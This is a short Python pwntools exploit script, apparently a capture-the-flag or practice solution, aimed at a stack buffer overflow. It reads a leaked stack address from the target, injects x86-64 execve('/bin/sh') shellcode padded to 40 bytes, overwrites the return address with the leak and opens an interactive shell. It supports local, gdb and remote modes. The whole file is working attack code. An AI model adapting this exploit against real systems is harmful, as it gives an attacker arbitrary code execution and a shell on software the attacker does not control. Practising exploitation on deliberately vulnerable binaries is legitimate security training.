#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["tmux", "split-window", "-h", "-p 65"]
        #terminal=["st"]
)

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
    '''


    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote()
    else:
        return process(binary)

def exploit(p,e,r):
    p.recvuntil(b"[*]Location:")
    leak = p64(int(p.recvline(), 16))
    pad_len = 40

    shellcode = asm("""
                    mov rbx, 0x68732f6e69622f
                    push rbx
                    mov eax, 59
                    xor rsi, rsi
                    xor rdx, rdx
                    mov rdi, rsp
                    syscall
                """)
    print(f"Len of shellcode {len(shellcode)}")

    padding = shellcode + b"A" * (0x28 - len(shellcode))
    p.sendline(padding + leak)
    p.interactive()


if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
